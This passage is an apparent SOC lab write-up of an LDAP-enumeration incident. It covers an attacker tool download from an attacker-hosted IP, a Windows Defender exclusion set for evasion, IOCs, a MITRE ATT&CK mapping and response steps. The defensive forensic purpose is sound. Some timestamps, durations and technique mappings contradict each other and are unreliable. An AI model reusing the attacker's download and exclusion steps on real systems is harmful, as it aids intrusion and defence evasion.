| **2024-10-05 15:01:00** | 🔴 Command shell opened — CMD.EXE | Prefetch | Prepares for command execution | T1059.003 |
| **2024-10-05 15:09:00** | 🔴 Download mechanism initiated — BITSADMIN | Prefetch | Background file transfer setup | T1197 |
| **2024-10-05 15:14:55** | 🔴 SharpHound download command | PowerShell Log | Invoke-WebRequest from attacker server | T1105 |
| **2024-10-05 15:19:33** | 🚨 DEFENSE EVASION — Exclusion added | Event 403 | PowerShell: Add-MpPreference exclusion | T1562.001 |
| **2024-10-05 15:19:34** | 🚨 Defender config change detected | Event 5007 | C:\Windows\Temp added to exclusion list | T1562.001 |
| **2024-10-05 15:19:48** | 🔴 SharpHound.exe file created | MFT $FN | File written to protected C:\Windows\Temp\ | T1105 |
| **2024-10-05 15:18:42** | 🚨 DETECTION — Defender alerts | Event 1116 | VirTool:MSIL/SharpHound.AIMTB detected | - |
| **2024-10-05 15:20:00** | 🔴 SharpHound EXECUTES | Prefetch | Active Directory enumeration queries execute | T1087.002 |
| **2024-10-05 15:18:51** | ✅ Defender quarantines SharpHound | Event 1117 | File moved to quarantine (0x00000000 success) | - |
| **2024-10-05 15:27:30** | 🔴 BloodHound.zip download | Event 1116 | certutil.exe downloads analysis tool | T1105 |
| **2024-10-05 15:21:00** | 🔴 BloodHound.zip created | MFT | Analysis tool in excluded C:\Windows\Temp\ | T1105 |

**Total attack duration: 39 minutes (14:48:58 → 15:27:30 UTC)**

**Critical windows:**
- Access to first enumeration command: 12 minutes
- Download to malware execution: 5 minutes (high efficiency)
- Detection to secondary tool download: 9 minutes (persistence in execution)

---

## 🧾 IOC Table (Indicators of Compromise)

| Type | Value | Context | Severity |
|---|---|---|---|
| **Source IP** | 192.168.110.129 | Attacker origin | Critical |
| **Access Type** | ANONYMOUS LOGON (S-1-5-7) | Null session authentication | Critical |
| **Logon Timestamp** | 2024-10-05 14:48:58 UTC | Initial compromise time | Critical |
| **Malware 1** | SharpHound.exe | AD enumeration tool | Critical |
| **Malware 1 SHA1** | a5059f5a353d7fa5014c0584c7ec18b808c2a02c | File fingerprint | Critical |
| **Malware 1 SHA256** | cc19c785702eea660a1dd7cbf9e4fef80b41384e8bd6ce26b7229e0251f24272 | Alternative hash | Critical |
| **Malware 1 Size** | 1022 KB | File size verification | Medium |
| **Malware 1 Family** | HackTool:MSIL/SharpHound | VirusTotal classification | Critical |
| **Malware 1 VT Detection** | 61/69 vendors | Threat intelligence | Critical |
| **Malware 2** | BloodHound.zip | AD attack path analyzer | Critical |
| **Download Source 1** | http://192.168.110.129/SharpHound.exe | Attacker-hosted server | Critical |
| **Download Source 2** | http://192.168.110.129/20241005082055_BloodHound.zip | Attacker-hosted server | Critical |
| **Execution Path 1** | C:\Windows\Temp\SharpHound.exe | Execution location | Critical |
| **Execution Path 2** | C:\Windows\Temp\20241005082055_BloodHound.zip | Tool storage | Critical |
| **Defender Exclusion** | HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Windows\Temp | Defense evasion registry | Critical |
| **Event 4624** | ANONYMOUS LOGON from 192.168.110.129 | Access detection | Critical |
| **Event 403** | Add-MpPreference exclusion command | Defense evasion detection | Critical |
| **Event 5007** | C:\Windows\Temp exclusion added | Config change detection | Critical |
| **Event 1116 (SharpHound)** | 2024-10-05 15:18:42 UTC | Detection timestamp | Critical |
| **Event 1116 (BloodHound)** | 2024-10-05 15:27:30 UTC | Secondary tool detection | Critical |
| **Event 1117** | Quarantine success (0x00000000) | Containment status | Medium |

---

## 🗺️ MITRE ATT&CK Mapping — Complete Attack Chain

| Phase | Tactic | Technique | ID | Evidence |
|---|---|---|---|---|
| **Access** | Initial Access | Exploit Public-Facing Application / LDAP | T1190 / T1087.002 | Null session LDAP bind |
| **Recon 1** | Discovery | System Owner/User Discovery | T1033 | WHOAMI.EXE execution |
| **Recon 2** | Execution | Windows Command Shell | T1059.003 | CMD.EXE execution |
| **Acquisition 1** | Persistence | BITS Jobs | T1197 | BITSADMIN.EXE execution |
| **Acquisition 2** | Command & Control | Ingress Tool Transfer | T1105 | SharpHound download via PowerShell |
| **Evasion 1** | Defense Evasion | Impair Defenses: Disable Tools | T1562.001 | Add-MpPreference exclusion |
| **Evasion 2** | Defense Evasion | Indicator Removal: Timestomp | T1070.006 | $SI timestamp modification |
| **Execution** | Execution | PowerShell Scripting | T1059.001 | PowerShell commands |
| **Discovery 1** | Discovery | Account Discovery: Domain | T1087.002 | SharpHound AD enumeration |
| **Discovery 2** | Discovery | Domain Trust Discovery | T1482 | SharpHound trust mapping |
| **Collection** | Collection | Data from Local System | T1005 | LDAP query results |
| **Acquisition 3** | Command & Control | Ingress Tool Transfer | T1105 | BloodHound.zip download |
| **Planning** | Planning | Privilege Escalation Path Discovery | T1550 | BloodHound analysis of attack paths |

---

## 🚨 Incident Response Actions

| Priority | Action | Rationale |
|---|---|---|
| 🔴 **Critical** | **Block IP 192.168.110.129 at all network boundaries** | Prevent further attacker access and command execution |
| 🔴 **Critical** | **Disable LDAP null bind / anonymous LDAP** | Prevent T1087.002 exploitation immediately |
| 🔴 **Critical** | **Force password reset for all domain admin accounts** | Attacker enumerated all admins; assume credential compromise risk |
| 🔴 **Critical** | **Audit all PowerShell execution logs for lateral movement** | Look for RDP connections, additional tool downloads after enumeration |
| 🟠 **High** | **Preserve all forensic evidence** | SharpHound JSON output files, BloodHound analysis, attacker tools |
| 🟠 **High** | **Search domain for persistence mechanisms** | Scheduled tasks, registry modifications, new user accounts created post-enumeration |
| 🟠 **High** | **Review domain admin login history (Event 4624)** | Identify any admin logins from 192.168.110.129 or compromise indicators |
| 🟠 **High** | **Check for lateral movement via RDP/SMB** | Analyze network logs for connections from 192.168.110.129 to other systems |
| 🟠 **High** | **Determine if SharpHound completed enumeration** | Check for JSON output files (Users.json, Groups.json, Computers.json, Trusts.json) |
| 🟠 **High** | **Determine if BloodHound was extracted/analyzed** | Check for evidence of BloodHound GUI execution or analysis |
| 🟡 **Medium** | **Implement Group Policy restriction on certutil.exe** | Block LOLBin abuse for file downloads |
| 🟡 **Medium** | **Enable advanced AD audit logging (Event 4661, 4662)** | Directory Services Access logging for LDAP query detection |
| 🟡 **Medium** | **Deploy application whitelisting for SharpHound** | Block execution by file hash, name, or code signature |
| 🟡 **Medium** | **Implement YARA rules for SharpHound detection** | Hunt for variants across network |
| 🟡 **Medium** | **Review Defender exclusion policies** | Ensure exclusions are legitimate; remove suspicious entries |
| 🟡 **Medium** | **Enable PowerShell Script Block Logging universally** | Detect future PowerShell-based attacks |
| 🟡 **Medium** | **Implement network IDS signatures for LDAP enumeration** | Detect similar queries from unknown sources |

---

## 📋 What to Investigate Next

**1. Locate SharpHound Output Files**
```
File System Search:
C:\Windows\Temp\
C:\Users\*\AppData\Local\
C:\Users\*\Downloads\

Look for:
  Users.json              → All domain users enumerated
  Groups.json             → All security groups enumerated
  Computers.json          → All domain computers enumerated
  Domains.json            → Domain metadata
  Trusts.json             → Domain trust relationships
  
These files prove what data was exfiltrated.
```

**2. Determine If BloodHound Was Analyzed**
```
Look for:
  BloodHound.exe execution in prefetch
  BloodHound GUI window creation
  JSON files loaded into BloodHound
  
This shows attacker planned privilege escalation paths.
```

**3. Check For Lateral Movement**
```
Event logs to review:
  Event 4624 (RDP logons from 192.168.110.129)
  Event 4688 (Process creation on other machines)
  Event 5156 (Firewall: Network connections)
  RDP Connection logs (Event 1024, 1025, 1026)
  
Network logs:
  SMB traffic from 192.168.110.129
  RDP sessions to domain computers
  C2 beaconing patterns
```

**4. Identify Persistence Mechanisms**
```
Registry locations:
  HKLM\SOFTWARE\Microsoft\Windows\Run
  HKLM\System\CurrentControlSet\Services\
  
Scheduled Tasks:
  C:\Windows\System32\Tasks\
  
WMI Event Subscriptions:
  Registry: HKLM\SOFTWARE\Classes\…\WMIEventLogical
```

**5. Search For Privilege Escalation Attempts**
```
Event logs:
  Event 4672 (Special privileges assigned)
  Event 4688 (Process creation as SYSTEM)
  Event 4720, 4722 (Account creation/modification)
  Event 4769 (Kerberos SPN requests - Kerberoasting)
  
Signs attacker acted on SharpHound findings.
```

---

## 📝 Lessons Learned

> **The attacker executed a textbook red team reconnaissance operation: gain access → check position → enumerate the domain → plan next moves. The 39-minute window from access to secondary tool download shows an attacker confident in their position and methodical in their approach. The sophistication of the defense evasion (Defender exclusion setup) and tool selection (SharpHound then BloodHound) indicates an operator with deep Windows/AD knowledge.**

Key takeaways:

1. **Anonymous LDAP null binds are a reconnaissance vector** — Even unauthenticated users can gather extensive domain information. Disabling anonymous LDAP and null session access is critical hardening.

2. **Real-time Defender protection works** — SharpHound was detected via signature matching, proving that maintaining current antivirus signatures is essential. However, the attacker had already executed the tool before quarantine.

3. **Windows Defender exclusions are dangerous** — Adding folders to exclusion lists provides excellent cover for malware. Monitor Event ID 5007 closely for unexpected exclusion additions.

4. **Event ID 403 (PowerShell engine lifecycle) reveals attacker commands** — The HostApplication field in Event 403 showed the Add-MpPreference exclusion command before Event 5007 confirmed it. Lower-volume PowerShell logs are better for quick threat detection than the noisy Operational logs.

5. **Prefetch proves execution** — The "Last Run" timestamp in prefetch files is reliable proof that code executed, independent of any malware hiding the execution.

6. **Time-to-tool is a reconnaissance indicator** — 26 minutes from access to SharpHound execution shows the attacker either knew the environment well or was following a practiced playbook. Speed indicates reconnaissance, not discovery.

7. **Two-stage tool deployment is common** — SharpHound (data collector) + BloodHound (analyzer) represents a sophisticated attack pattern. Attackers collect data, then analyze it locally before acting.

8. **VirusTotal confirmation matters** — Matching the local hash against VirusTotal's 61/69 detection rate provides definitive threat intelligence confirmation and enables artifact sharing with the incident response team.

9. **LOLBins expand attacker options** — certutil.exe download capability provided an alternative to PowerShell when the attacker needed diversity in tool usage.

10. **LDAP enumeration precedes privilege escalation** — SharpHound and BloodHound together enable attackers to identify the optimal privilege escalation path before attempting lateral movement. The presence of these tools suggests privilege escalation/lateral movement attempts will follow.

---

## 📚 References & Resources

| Resource | Link |
|---|---|
| **MITRE ATT&CK — Account Discovery** | https://attack.mitre.org/techniques/T1087/ |
| **MITRE ATT&CK — LDAP** | https://attack.mitre.org/techniques/T1087/002/ |
| **MITRE ATT&CK — Impair Defenses** | https://attack.mitre.org/techniques/T1562/001/ |
| **MITRE ATT&CK — BITS Jobs** | https://attack.mitre.org/techniques/T1197/ |
| **SharpHound GitHub** | https://github.com/BloodHoundAD/SharpHound |
| **BloodHound GitHub** | https://github.com/BloodHoundAD/BloodHound |
| **Windows Event IDs** | https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/ |
| **VirusTotal** | https://www.virustotal.com/ |
| **Eric Zimmermann Tools** | https://ericzimmerman.github.io/ |

---

## 🎓 Forensic Techniques Demonstrated

### **Artifact 1: Event Log Analysis (4624, 403, 5007, 1116, 1117)**
**Why we used it:** Track access, detect command execution, monitor defense changes, identify detections
**Learning:** Event IDs are sequential indicators; correlate timestamps across multiple event logs
**Key finding:** Event 403 revealed attacker command BEFORE Event 5007 confirmed it

### **Artifact 2: Prefetch File Analysis**
**Why we used it:** Prove process execution independent of other artifacts
**Tool:** PECmd
**Learning:** Prefetch "Last Run" timestamp is reliable execution proof; files persist after deletion
**Key finding:** SharpHound executed at 15:20:00 UTC despite quarantine minutes earlier

### **Artifact 3: MFT Analysis**
**Why we used it:** Determine file creation time and detect timestomping attempts
**Tool:** MFT Explorer
**Learning:** $FILE_NAME (FN) vs $STANDARD_INFORMATION (SI) divergence indicates tampering
**Key finding:** SharpHound created at 15:19:48, SI modified later (15:49:18) = timestomp attempt

### **Artifact 4: PowerShell Event Logs (403 vs Operational)**
**Why we used it:** Find attacker commands with less noise than Operational logs
**Tool:** Event Viewer filtering
**Learning:** PowerShell.evtx Event 403 shows engine lifecycle with HostApplication field containing the actual command
**Key finding:** Add-MpPreference exclusion command visible in Event 403 details

### **Artifact 5: Windows Defender Logs (1116, 1117)**
**Why we used it:** Confirm malware detection and quarantine actions
**Tool:** Event Viewer + Windows Defender Support logs
**Learning:** Event 1116 = detection; Event 1117 = action taken; Support logs contain detailed hashes
**Key finding:** 61/69 vendor detection rate on VirusTotal confirmed threat legitimacy

### **Artifact 6: VirusTotal Threat Intelligence**
**Why we used it:** Classify malware family and cross-check with external threat database
**Tool:** VirusTotal online service
**Learning:** Hash matching provides definitive threat classification; 61/69 detection = universal recognition
**Key finding:** Confirmed SharpHound/Bloodhound red team tool family

---

*Writeup by: Moetez Bouchlaghem*
*SOC-Investigation-Lab | GhnimiWael*
*Lab Source: https://app.letsdefend.io/challenge/ldap-enumeration*
